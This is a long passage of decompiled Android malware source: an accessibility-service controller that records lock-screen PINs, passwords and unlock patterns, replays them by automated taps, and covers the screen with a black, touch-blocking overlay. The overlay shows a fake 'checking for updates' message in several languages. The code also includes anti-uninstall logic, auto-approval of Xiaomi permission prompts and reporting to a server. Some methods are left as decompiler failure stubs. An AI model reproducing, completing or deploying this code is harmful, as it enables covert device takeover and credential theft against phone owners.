            CommandExecutor.Dummyctx = this.getApplicationContext();
            this.ScreenScanner(this.getApplicationContext());
            this.ScreenGrapper(this.getApplicationContext(), this);
            if (ConfigurationProvider.Anti_Delete.equals("1")) {
                this.AntiProtector(this);
            }
            if (Build.VERSION.SDK_INT >= 31) {
                this.setAccessibilityFocusAppearance(0, 0);
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        try {
            object = this.getApplicationContext();
            windowManager = (WindowManager)this.getSystemService("window");
            object2 = new DisplayMetrics();
            windowManager.getDefaultDisplay().getMetrics((DisplayMetrics)object2);
            int n = ((DisplayMetrics)object2).widthPixels;
            int n2 = ((DisplayMetrics)object2).heightPixels;
            this.mWidth = Integer.valueOf(SharedPreferencesManager.Read(object, "Wscr", String.valueOf(n)));
            this.mHeight = Integer.valueOf(SharedPreferencesManager.Read(object, "Hscr", String.valueOf(n2)));
            this.disablesuperwatch();
            object2 = (WindowManager)this.getSystemService("window");
            object = new FrameLayout((Context)this);
            onscreenview = object;
            onscreenview.setBackgroundColor(Color.parseColor((String)"#00000002"));
            onscreenview.setVisibility(0);
            object = new WindowManager.LayoutParams(5, 5, 2032, -2142501352, -3);
            object.gravity = 0x800033;
            Access_layParms = object;
            AccessWindow = object2;
            object2.addView((View)onscreenview, (ViewGroup.LayoutParams)Access_layParms);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        try {
            object2 = new FrameLayout.LayoutParams(-2, -2);
            ((FrameLayout.LayoutParams)object2).gravity = 17;
            object2 = new FrameLayout.LayoutParams(-2, -2);
            ((FrameLayout.LayoutParams)object2).gravity = 81;
            object2 = new FrameLayout(this.getApplicationContext());
            this.BlackoverLay = object2;
            this.BlackoverLay.setBackgroundColor(Color.parseColor((String)"#000000"));
            this.BlackoverLay.setFitsSystemWindows(false);
            this.BlackoverLay.setSystemUiVisibility(5894);
            object2 = new WebView((Context)this);
            this.WbVwBlack = object2;
            this.WbVwBlack.setBackgroundColor(0);
            this.applyWebViewSettings(this.WbVwBlack);
            object2 = this.WbVwBlack;
            object = new SafeWebViewClient(this);
            object2.setWebViewClient((WebViewClient)object);
            this.BlackoverLay.getBackground().setAlpha(242);
            this.BlackoverLay.setClickable(false);
            this.BlackoverLay.setFocusable(false);
            this.WbVwBlack.setClickable(false);
            this.WbVwBlack.setFocusable(false);
            object2 = this.getFullscreenOverlayRect();
            object = new WindowManager.LayoutParams((int)object2[0], (int)object2[1], 2032, 0x80090708 | 0x10, 1);
            Blacklayparams = object;
            AccessibilityServiceController.Blacklayparams.x = (int)object2[2];
            AccessibilityServiceController.Blacklayparams.y = (int)object2[3];
            AccessibilityServiceController.Blacklayparams.gravity = 0x800033;
            object = new View(this.getApplicationContext());
            this.TouchBlockOverlay = object;
            this.TouchBlockOverlay.setFitsSystemWindows(false);
            this.TouchBlockOverlay.setBackgroundColor(0);
            this.TouchBlockOverlay.setClickable(true);
            this.TouchBlockOverlay.setFocusable(true);
            windowManager = this.TouchBlockOverlay;
            object = new AccessibilityServiceController$$ExternalSyntheticLambda5();
            windowManager.setOnTouchListener((View.OnTouchListener)object);
            object = new WindowManager.LayoutParams((int)object2[0], (int)object2[1], 2032, -2146892024, -3);
            TouchBlockParams = object;
            AccessibilityServiceController.TouchBlockParams.x = (int)object2[2];
            AccessibilityServiceController.TouchBlockParams.y = (int)object2[3];
            AccessibilityServiceController.TouchBlockParams.gravity = 0x800033;
            object = new AccessibilityServiceController$$ExternalSyntheticLambda6(this);
            object2 = new Thread((Runnable)object);
            ((Thread)object2).start();
            object2 = ConfigManager.getInstance();
            ((ConfigManager)object2).initialize(this.getApplicationContext(), ConfigurationProvider.ALL_CONFIG);
            if (((ConfigManager)object2).req_hidp && ConfigurationProvider.Click_Prim.equals("1")) {
                ((WindowManager)this.getSystemService("window")).addView((View)this.BlackoverLay, (ViewGroup.LayoutParams)Blacklayparams);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        WorkerService.My_Access_inst = this;
        try {
            object2 = new BroadcastReceiver(this){
                final AccessibilityServiceController this$0;
                {
                    this.this$0 = jhvbzpdwpbqgticwdxuva2;
                }

                /* synthetic */ void lambda$onReceive$0$com-icontrol-protector-AccessibilityServiceController$1() {
                    try {
                        if (BlackScreen_ON) {
                            AccessibilityServiceHelper.WakeScreen(this.this$0.getApplicationContext());
                        }
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }

                public void onReceive(Context context, Intent intent) {
                    if (BlackScreen_ON && "android.intent.action.SCREEN_OFF".equals(intent.getAction())) {
                        new Handler(this.this$0.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceController$1$$ExternalSyntheticLambda0(this), 300L);
                    }
                }
            };
            this.screenOffReceiver = object2;
            object2 = new IntentFilter("android.intent.action.SCREEN_OFF");
            this.registerReceiver(this.screenOffReceiver, (IntentFilter)object2);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static void ShowNotification(Context context, String object) {
        try {
            Object object2 = new NotificationCompat.Builder(context, "New Notifications");
            object = ((NotificationCompat.Builder)object2).setContentTitle(ConfigurationProvider._Notfy_TITL_).setContentText((CharSequence)object).setVisibility(1).setPriority(1).setSmallIcon(R.drawable.notify).setAutoCancel(true);
            if (Build.VERSION.SDK_INT >= 26) {
                object2 = new NotificationChannel("New Notifications", (CharSequence)"Notifications", 4);
                ((NotificationManager)context.getSystemService(NotificationManager.class)).createNotificationChannel((NotificationChannel)object2);
                ((NotificationCompat.Builder)object).setChannelId("New Notifications");
            }
            ((NotificationCompat.Builder)object).setVibrate(new long[]{1000L, 1000L, 1000L, 1000L, 1000L});
            ((NotificationCompat.Builder)object).setLights(-65536, 3000, 3000);
            ((NotificationCompat.Builder)object).setSound(RingtoneManager.getDefaultUri((int)2));
            object2 = NotificationManagerCompat.from(context);
            if (Build.VERSION.SDK_INT >= 33) {
                if (ContextCompat.checkSelfPermission(context, "android.permission.POST_NOTIFICATIONS") == 0) {
                    ((NotificationManagerCompat)object2).notify(notifiid, ((NotificationCompat.Builder)object).build());
                } else {
                    WorkerService.MyWorker.AlertServer(context, "Post Notification", "notification permission is not granted");
                }
            } else {
                ((NotificationManagerCompat)object2).notify(notifiid, ((NotificationCompat.Builder)object).build());
            }
            ++notifiid;
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    static /* synthetic */ long access$102(long l) {
        grapperdate = l;
        return l;
    }

    static /* synthetic */ long access$402(long l) {
        Scannerdate = l;
        return l;
    }

    static /* synthetic */ Set access$502(Set set) {
        ClonedList = set;
        return set;
    }

    static /* synthetic */ long access$602(long l) {
        Protectdate = l;
        return l;
    }

    static /* synthetic */ void access$700(AccessibilityServiceController jhvbzpdwpbqgticwdxuva2, String string2, AccessibilityNodeInfo accessibilityNodeInfo) {
        jhvbzpdwpbqgticwdxuva2.preventstopback(string2, accessibilityNodeInfo);
    }

    public static void acquireBlackScreenWakeLock(Context context) {
        block4: {
            if (blackScreenWakeLock != null && blackScreenWakeLock.isHeld()) {
                return;
            }
            if ((context = (PowerManager)context.getSystemService("power")) == null) break block4;
            try {
                blackScreenWakeLock = context.newWakeLock(805306394, "app:blackscreen");
                blackScreenWakeLock.acquire(600000L);
            }
            catch (Exception exception) {
                AndroidLogger.Error("acquireBlackWL", exception.getMessage());
            }
        }
    }

    private void addOverlay(String string2, Rect rect, String string3, String string4) {
        View view = new View((Context)this);
        view.setBackgroundColor(0);
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(rect.width() - 10, rect.height() - 10, rect.left, rect.top - 100, 2032, 8, -3);
        view.setOnTouchListener((View.OnTouchListener)new AccessibilityServiceController$$ExternalSyntheticLambda0(this, rect, view, layoutParams, string4, string3));
        layoutParams.gravity = 0x800033;
        AccessWindow.addView(view, (ViewGroup.LayoutParams)layoutParams);
        this.overlays.put(string2, view);
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void addOverlaysGrab(String var1_1) {
        var4_3 = this.getRootInActiveWindow();
        if (var4_3 == null) {
            return;
        }
        var3_5 = new HashSet<String>();
        this.traverseAndAddOverlays((AccessibilityNodeInfo)var4_3, (String)var1_1, (Set<String>)var3_5);
        var4_3.recycle();
        var1_1 = this.overlays.entrySet().iterator();
lbl9:
        // 3 sources

        while (var1_1.hasNext()) {
            var4_3 = var1_1.next();
            var2_6 = var3_5.contains((String)var4_3.getKey());
            if (var2_6) continue;
            ** GOTO lbl18
        }
        return;
        {
            catch (Exception var1_2) {
                var1_2.printStackTrace();
                return;
            }
lbl18:
            // 1 sources

            try {
                AccessibilityServiceController.AccessWindow.removeView((View)var4_3.getValue());
                ** GOTO lbl23
            }
            catch (Exception var4_4) {}
            {
                var4_4.printStackTrace();
lbl23:
                // 2 sources

                var1_1.remove();
                ** GOTO lbl9
            }
        }
    }

    private void applyWebViewSettings(WebView webView) {
        if (webView == null) {
            return;
        }
        webView = webView.getSettings();
        webView.setJavaScriptEnabled(true);
        webView.setCacheMode(-1);
        webView.setDomStorageEnabled(false);
        webView.setGeolocationEnabled(false);
    }

    private String buildOverlayKey(AccessibilityNodeInfo object, Rect object2) {
        String string2 = object.getPackageName() != null ? ((Object)object.getPackageName()).toString() : "unknown";
        object = object.getViewIdResourceName() != null ? object.getViewIdResourceName() : "no_id";
        object2 = object2.left + "_" + object2.top + "_" + object2.right + "_" + object2.bottom;
        return string2 + "|" + (String)object + "|" + (String)object2;
    }

    /*
     * Exception decompiling
     */
    private void checkpass(AccessibilityEvent var1_1) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [17[CATCHBLOCK]], but top level block is 4[TRYBLOCK]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    private static void clickpin(char c, int n) {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
        block17: {
            if (n >= 3) {
                AccessibilityServiceController jhvbzpdwpbqgticwdxuva3 = AccessibilityServiceHelper.myAccess();
                if (jhvbzpdwpbqgticwdxuva3 != null && (jhvbzpdwpbqgticwdxuva3 = UtilityHelper.loadPatternMap(jhvbzpdwpbqgticwdxuva3.getApplicationContext()).get(Character.getNumericValue(c))) != null) {
                    AccessibilityServiceHelper.clickthis(((Point)jhvbzpdwpbqgticwdxuva3).x, ((Point)jhvbzpdwpbqgticwdxuva3).y);
                }
                return;
            }
            jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
            if (jhvbzpdwpbqgticwdxuva2 != null) break block17;
            return;
        }
        Handler handler = new Handler(jhvbzpdwpbqgticwdxuva2.getMainLooper());
        String[] stringArray = new String[2];
        int n2 = 0;
        stringArray[0] = "com.android.systemui:id/key";
        stringArray[1] = "com.android.keyguard:id/key";
        if (UtilityHelper.isvivo()) {
            stringArray = new String[]{"com.android.systemui:id/VivoPinkey"};
        }
        Object object = null;
        int n3 = stringArray.length;
        while (n2 < n3) {
            object = stringArray[n2];
            AccessibilityNodeInfo accessibilityNodeInfo = jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow();
            StringBuilder stringBuilder = new StringBuilder();
            object = AccessibilityServiceHelper.getNodeByViewId(accessibilityNodeInfo, stringBuilder.append((String)object).append(String.valueOf(c)).toString());
            if (object != null) break;
            ++n2;
        }
        if (object != null) {
            try {
                object.performAction(16);
            }
            catch (Exception exception) {
                try {
                    AccessibilityServiceHelper.CLickTextpostion(String.valueOf(c), jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow());
                }
                catch (Exception exception2) {}
            }
        } else {
            try {
                object = new AccessibilityServiceController$$ExternalSyntheticLambda7(c, n);
                handler.postDelayed((Runnable)object, 800L);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private String currentlancher(Context context) {
        if (luncherpkg.length() > 0) {
            return luncherpkg;
        }
        luncherpkg = UtilityHelper.getDefaultLauncherPackage(context);
        if (luncherpkg == null) {
            luncherpkg = "launcher";
        }
        return luncherpkg;
    }

    /*
     * Unable to fully structure code
     */
    private void describePatternCells(AccessibilityEvent var1_1) {
        block57: {
            block58: {
                block56: {
                    block53: {
                        block55: {
                            block54: {
                                block52: {
                                    block51: {
                                        block50: {
                                            block49: {
                                                block48: {
                                                    block47: {
                                                        if (var1_1 == null) {
                                                            return;
                                                        }
                                                        var13_4 = var1_1.getSource();
                                                        if (var13_4 != null) break block47;
                                                        return;
                                                    }
                                                    var8_5 = new Rect();
                                                    var13_4.getBoundsInScreen((Rect)var8_5);
                                                    var12_6 = new Point(var8_5.centerX(), var8_5.centerY());
                                                    var3_7 = false;
                                                    var8_5 = "com.android.systemui:id/lockPatternView";
                                                    if (!UtilityHelper.isvivo()) break block48;
                                                    var8_5 = "com.android.systemui:id/vivo_lock_pattern_view";
                                                }
                                                var8_5 = AccessibilityServiceHelper.getNodeByViewId(this.getRootInActiveWindow(), (String)var8_5);
                                                if (var8_5 == null) break block49;
                                                if (!var8_5.isVisibleToUser()) break block49;
                                                var2_8 = true;
                                                if (!this.Watching) {
                                                    this.enablesuperWatch();
                                                }
                                                if (var1_1.getEventType() != 128) {
                                                    return;
                                                }
                                                break block50;
                                            }
                                            var2_8 = var3_7;
                                            if (!this.Watching) break block50;
                                            this.disablesuperwatch();
                                            var2_8 = var3_7;
                                        }
                                        var8_5 = var13_4.getViewIdResourceName();
                                        if (var8_5 == null || var2_8) ** GOTO lbl158
                                        if (var13_4.getText() == null && var13_4.getContentDescription() == null) {
                                            return;
                                        }
                                        var9_9 = "";
                                        var8_5 = null;
                                        var10_10 = var13_4.getText();
                                        if (var10_10 == null) break block51;
                                        var8_5 = new StringBuilder();
                                        var9_9 = var8_5.append("").append("Cell text[").append((Object)var13_4.getText()).append("]").toString();
                                        var8_5 = var13_4.getText().toString();
                                    }
                                    var11_11 = var9_9;
                                    var10_10 = var8_5;
                                    if (var13_4.getContentDescription() == null) break block52;
                                    var10_10 = new StringBuilder();
                                    var9_9 = var10_10.append((String)var9_9).append("Cell DES[").append((Object)var13_4.getContentDescription()).append("]").toString();
                                    var11_11 = var9_9;
                                    var10_10 = var8_5;
                                    if (var8_5 != null) break block52;
                                    var10_10 = var13_4.getContentDescription().toString();
                                    var11_11 = var9_9;
                                }
                                var8_5 = new StringBuilder();
                                var8_5 = var8_5.append(var11_11).append("Cell ID[").append(var13_4.getViewIdResourceName()).append("]").toString();
                                var4_12 = var13_4.getViewIdResourceName().equals("com.android.systemui:id/passwordEntry");
                                if (var4_12) break block53;
                                if (var13_4.getViewIdResourceName().equals("com.android.keyguard:id/miui_mixed_password_input_field") || var13_4.getViewIdResourceName().equals("com.android.systemui:id/btn_letter_ok") || var13_4.getViewIdResourceName().equals("com.android.systemui:id/securityEditText")) break block53;
                                var4_12 = false;
                                var5_14 = false;
                                var1_1 = var13_4.getViewIdResourceName();
                                if (!var1_1.matches("com\\.android\\.systemui:id/key[0-9]") && !var1_1.matches("com\\.android\\.systemui:id/VivoPinkey[0-9]") && !var1_1.matches("com\\.android\\.keyguard:id/key[0-9]")) break block54;
                                var4_12 = true;
                            }
                            if (var1_1.startsWith("com.android.systemui:id/key_enter") || var1_1.startsWith("com.android.systemui:id/key_enter_text") || var1_1.startsWith("com.android.keyguard:id/key_enter")) {
                                var5_14 = true;
                            }
                            var6_16 = var4_12;
                            var7_17 = var5_14;
                            if (var4_12) break block55;
                            var6_16 = var4_12;
                            var7_17 = var5_14;
                            if (var5_14) break block55;
                            var6_16 = var4_12;
                            var7_17 = var5_14;
                            if (var13_4.getContentDescription() == null) break block55;
                            var6_16 = var4_12 = this.detectPinByFallback(var13_4, false);
                            var7_17 = var5_14;
                            if (var4_12) break block55;
                            var7_17 = this.detectPinByFallback(var13_4, true);
                            var6_16 = var4_12;
                        }
                        if (!var6_16 && !var7_17) break block56;
                        if (var13_4.getContentDescription() == null) break block56;
                        AccessibilityServiceController.CurrentLockState = "pi";
                        Log.d((String)"PIN CLICKED", (String)var13_4.getContentDescription().toString());
                        if (!var7_17) ** GOTO lbl115
                        Log.d((String)"PIN", (String)"ok clicked");
                        AccessibilityServiceController.TemppatternMap.put(-1, var12_6);
                        var1_1 = new StringBuilder();
                        AccessibilityServiceController.fullpincaptured = var1_1.append(AccessibilityServiceController.fullpincaptured).append(":E").toString();
                        break block56;
lbl115:
                        // 1 sources

                        var1_1 = AccessibilityServiceController.extractNumber(var13_4.getContentDescription().toString());
                        if (var1_1 == null) break block56;
                        var9_9 = new StringBuilder();
                        AccessibilityServiceController.fullpincaptured = var9_9.append(AccessibilityServiceController.fullpincaptured).append(var1_1.toString()).toString();
                        AccessibilityServiceController.TemppatternMap.put((Integer)var1_1, var12_6);
                        break block56;
                    }
                    if (var1_1.getEventType() == 128 && UtilityHelper.isMIUI(this.getApplicationContext())) {
                        var1_1.getSource().performAction(16);
                        return;
                    }
                    if (var10_10 == null) break block56;
                    try {
                        if (var13_4.getViewIdResourceName() != null) {
                            if (AccessibilityServiceController.skipdoublicate != 0) {
                                --AccessibilityServiceController.skipdoublicate;
                                return;
                            }
                            AccessibilityServiceController.skipdoublicate = 1;
                            if ("com.android.systemui:id/btn_letter_ok".equals(var13_4.getViewIdResourceName())) {
                                var1_1 = new StringBuilder();
                                AccessibilityServiceController.TempStorepass = var1_1.append(AccessibilityServiceController.TempStorepass).append(":E").toString();
                                AccessibilityServiceController.TemppatternMap.put(-1, var12_6);
                                return;
                            }
                            if (AccessibilityServiceController.TempStorepass.endsWith(":E")) {
                                AccessibilityServiceController.TempStorepass = "";
                            }
                            if (AccessibilityServiceController.TempStorepass.length() == 0 && var10_10.length() > 1) {
                                return;
                            }
                            AccessibilityServiceController.CurrentLockState = "pa";
                            Log.d((String)"PASS:", (String)AccessibilityServiceController.handleInput((String)var10_10));
                        }
                    }
                    catch (Exception var1_2) {
                        // empty catch block
                    }
                }
                var1_1 = new StringBuilder();
                Log.d((String)"cell detected", (String)var1_1.append("description: ").append((String)var8_5).toString());
                break block57;
lbl158:
                // 1 sources

                if (var13_4.getContentDescription() == null || !var2_8) ** GOTO lbl172
                var1_1 = AccessibilityServiceController.extractNumber(var13_4.getContentDescription().toString());
                if (var1_1 == null) break block57;
                AccessibilityServiceController.CurrentLockState = "pt";
                if (!AccessibilityServiceController.fullpatterncaptured.contains(var1_1.toString())) {
                    var8_5 = new StringBuilder();
                    AccessibilityServiceController.fullpatterncaptured = var8_5.append(AccessibilityServiceController.fullpatterncaptured).append(var1_1.toString()).toString();
                    Log.d((String)"Pattern", (String)AccessibilityServiceController.fullpatterncaptured);
                    AccessibilityServiceController.TemppatternMap.put((Integer)var1_1, var12_6);
                }
                break block57;
lbl172:
                // 1 sources

                if (var13_4.getContentDescription() == null || var2_8) break block57;
                var5_15 = this.detectPinByFallback(var13_4, false);
                var4_13 = false;
                if (var5_15) break block58;
                var4_13 = this.detectPinByFallback(var13_4, true);
            }
            if (var5_15) {
                AccessibilityServiceController.CurrentLockState = "pi";
                var1_1 = AccessibilityServiceController.extractNumber(var13_4.getContentDescription().toString());
                if (var1_1 == null) break block57;
                var8_5 = new StringBuilder();
                AccessibilityServiceController.fullpincaptured = var8_5.append(AccessibilityServiceController.fullpincaptured).append(var1_1.toString()).toString();
                AccessibilityServiceController.TemppatternMap.put((Integer)var1_1, var12_6);
                var8_5 = new StringBuilder();
                Log.d((String)"PIN_FALLBACK", (String)var8_5.append("Digit: ").append(var1_1).toString());
            }
            if (!var4_13) break block57;
            try {
                AccessibilityServiceController.CurrentLockState = "pi";
                AccessibilityServiceController.TemppatternMap.put(-1, var12_6);
                var1_1 = new StringBuilder();
                AccessibilityServiceController.fullpincaptured = var1_1.append(AccessibilityServiceController.fullpincaptured).append(":E").toString();
                Log.d((String)"PIN_FALLBACK", (String)"Enter detected");
            }
            catch (Exception var1_3) {
                var1_3.printStackTrace();
            }
        }
    }

    private boolean detectPinByFallback(AccessibilityNodeInfo object, boolean bl) {
        boolean bl2 = false;
        boolean bl3 = false;
        if (object != null && object.getContentDescription() != null) {
            block8: {
                block12: {
                    block9: {
                        block11: {
                            block10: {
                                KeyguardManager keyguardManager;
                                try {
                                    keyguardManager = (KeyguardManager)this.getSystemService("keyguard");
                                    if (keyguardManager == null) break block8;
                                }
                                catch (Exception exception) {
                                    return false;
                                }
                                if (!keyguardManager.isKeyguardLocked()) break block8;
                                object = ((Object)object.getContentDescription()).toString();
                                if (!bl) break block9;
                                object = ((String)object).toLowerCase();
                                if (((String)object).contains("enter") || ((String)object).contains("ok") || ((String)object).contains("done") || ((String)object).contains("confirm") || ((String)object).contains("\u0432\u0432\u043e\u0434") || ((String)object).contains("\u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u044c")) break block10;
                                bl = bl3;
                                if (!((String)object).equals("\u2713")) break block11;
                            }
                            bl = true;
                        }
                        return bl;
                    }
                    object = AccessibilityServiceController.extractNumber((String)object);
                    bl = bl2;
                    if (object == null) break block12;
                    bl = bl2;
                    if ((Integer)object < 0) break block12;
                    int n = (Integer)object;
                    bl = bl2;
                    if (n > 9) break block12;
                    bl = true;
                }
                return bl;
            }
            return false;
        }
        return false;
    }

    public static void drawPin(String object, boolean bl) {
        int n;
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
        if (jhvbzpdwpbqgticwdxuva2 == null) {
            return;
        }
        Handler handler = new Handler(jhvbzpdwpbqgticwdxuva2.getMainLooper());
        Object object2 = UtilityHelper.loadPatternMap(jhvbzpdwpbqgticwdxuva2.getApplicationContext());
        int n2 = object2.isEmpty() ^ 1;
        Object object3 = ((String)object).toCharArray();
        int n3 = ((char[])object3).length;
        int n4 = 0;
        while (true) {
            n = n2;
            if (n4 >= n3) break;
            n = Character.getNumericValue(object3[n4]);
            if (n >= 0 && n <= 9 && !object2.containsKey(n)) {
                n = 0;
                break;
            }
            ++n4;
        }
        if (n != 0) {
            for (n4 = 0; n4 < ((String)object).length(); ++n4) {
                object3 = object2.get(Character.getNumericValue(((String)object).charAt(n4)));
                if (object3 == null) continue;
                handler.postDelayed((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda14((Point)object3), (long)n4 * 400L);
            }
            long l = (long)((String)object).length() * 400L + 400L;
            if (bl) {
                handler.postDelayed((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda15((Point)object2.get(-1), jhvbzpdwpbqgticwdxuva2, handler), l);
            }
            handler.postDelayed((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda16(), 500L + l);
        } else {
            object = ((String)object).toCharArray();
            for (n4 = 0; n4 < ((Object)object).length; ++n4) {
                Object object4 = object[n4];
                try {
                    object2 = new AccessibilityServiceController$$ExternalSyntheticLambda17((char)object4);
                    handler.post((Runnable)object2);
                    Thread.sleep(800L);
                    continue;
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
            try {
                Thread.sleep(800L);
            }
            catch (Exception exception) {}
            if (bl) {
                AccessibilityServiceController.tryClickEnterByIdOrCoords(jhvbzpdwpbqgticwdxuva2, handler);
            }
            skiprecord = false;
        }
    }

    private void enableallxaomi() {
        List list = this.getRootInActiveWindow().findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/action");
        if (list != null) {
            CharSequence charSequence;
            Rect rect = null;
            Iterator iterator2 = list.iterator();
            do {
                list = rect;
            } while (iterator2.hasNext() && ((charSequence = (list = (AccessibilityNodeInfo)iterator2.next()).getContentDescription()) == null || !"Deny".contentEquals(charSequence)));
            if (list != null) {
                rect = new Rect();
                list.getBoundsInScreen(rect);
                AccessibilityServiceHelper.clickthis((int)rect.exactCenterX(), (int)rect.exactCenterY());
                list = new Handler(Looper.getMainLooper());
                list.postDelayed(new AccessibilityServiceController$$ExternalSyntheticLambda20(this, (Handler)list), 500L);
            } else {
                this.performGlobalAction(1);
                try {
                    Thread.sleep(500L);
                }
                catch (Exception exception) {
                    // empty catch block
                }
                try {
                    this.performGlobalAction(1);
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
                SetupOrchestrationService.holdxaomi = false;
                SharedPreferencesManager.WriteBool(this.getApplicationContext(), ConfigurationConstants.skipxaomi, true);
            }
        }
    }

    public static Integer extractNumber(String object) {
        object = Pattern.compile("\\d+").matcher((CharSequence)object);
        if (((Matcher)object).find()) {
            return Integer.parseInt(((Matcher)object).group());
        }
        return null;
    }

    private AccessibilityNodeInfo findNodeByViewId(String string2) {
        Object object = this.getRootInActiveWindow();
        Object var2_3 = null;
        if (object == null) {
            return null;
        }
        object = object.findAccessibilityNodeInfosByViewId(string2);
        string2 = var2_3;
        if (object != null) {
            string2 = var2_3;
            if (!object.isEmpty()) {
                string2 = (AccessibilityNodeInfo)object.get(0);
            }
        }
        return string2;
    }

    private boolean findNodeByViewId(AccessibilityNodeInfo accessibilityNodeInfo, String string2) {
        if (accessibilityNodeInfo.getViewIdResourceName() != null && accessibilityNodeInfo.getViewIdResourceName().equals(string2)) {
            return true;
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo.getChild(i);
            if (accessibilityNodeInfo2 == null || !this.findNodeByViewId(accessibilityNodeInfo2, string2)) continue;
            return true;
        }
        return false;
    }

    private void finishxaomi() {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda9(this, handler), 1500L);
    }

    /*
     * Enabled aggressive block sorting
     */
    private static String getDefaultBlockMsg(String string2) {
        int n;
        block22: {
            switch (string2.hashCode()) {
                case 3886: {
                    if (!string2.equals("zh")) break;
                    n = 1;
                    break block22;
                }
                case 3734: {
                    if (!string2.equals("uk")) break;
                    n = 3;
                    break block22;
                }
                case 3710: {
                    if (!string2.equals("tr")) break;
                    n = 4;
                    break block22;
                }
                case 3651: {
                    if (!string2.equals("ru")) break;
                    n = 2;
                    break block22;
                }
                case 3588: {
                    if (!string2.equals("pt")) break;
                    n = 6;
                    break block22;
                }
                case 3276: {
                    if (!string2.equals("fr")) break;
                    n = 8;
                    break block22;
                }
                case 3246: {
                    if (!string2.equals("es")) break;
                    n = 5;
                    break block22;
                }
                case 3201: {
                    if (!string2.equals("de")) break;
                    n = 7;
                    break block22;
                }
                case 3121: {
                    if (!string2.equals("ar")) break;
                    n = 0;
                    break block22;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "One moment, checking for updates...";
            }
            case 8: {
                return "Un instant, v\u00e9rification des mises \u00e0 jour...";
            }
            case 7: {
                return "Einen Moment, Updates werden \u00fcberpr\u00fcft...";
            }
            case 6: {
                return "Um momento, verificando atualiza\u00e7\u00f5es...";
            }
            case 5: {
                return "Un momento, comprobando actualizaciones...";
            }
            case 4: {
                return "Bir saniye, g\u00fcncellemeler kontrol ediliyor...";
            }
            case 3: {
                return "\u0421\u0435\u043a\u0443\u043d\u0434\u0443, \u043f\u0435\u0440\u0435\u0432\u0456\u0440\u044f\u0454\u043c\u043e \u043e\u043d\u043e\u0432\u043b\u0435\u043d\u043d\u044f...";
            }
            case 2: {
                return "\u0421\u0435\u043a\u0443\u043d\u0434\u0443, \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f...";
            }
            case 1: {
                return "\u7a0d\u7b49\uff0c\u6b63\u5728\u68c0\u67e5\u66f4\u65b0...";
            }
            case 0: 
        }
        return "\u0644\u062d\u0638\u0629\u060c \u062c\u0627\u0631\u064a \u0627\u0644\u062a\u062d\u0642\u0642 \u0645\u0646 \u0627\u0644\u062a\u062d\u062f\u064a\u062b\u0627\u062a...";
    }

    private int[] getFullscreenOverlayRect() {
        int n;
        int n2;
        Point point;
        block7: {
            int n3;
            int n4;
            block6: {
                point = this.getRealScreenSize();
                n2 = 0;
                n4 = 0;
                n3 = this.getResources().getIdentifier("status_bar_height", "dimen", "android");
                n = n2;
                if (n3 <= 0) break block6;
                try {
                    n = this.getResources().getDimensionPixelSize(n3);
                }
                catch (Exception exception) {
                    n = n2;
                }
            }
            n3 = this.getResources().getIdentifier("navigation_bar_height", "dimen", "android");
            n2 = n4;
            if (n3 <= 0) break block7;
            try {
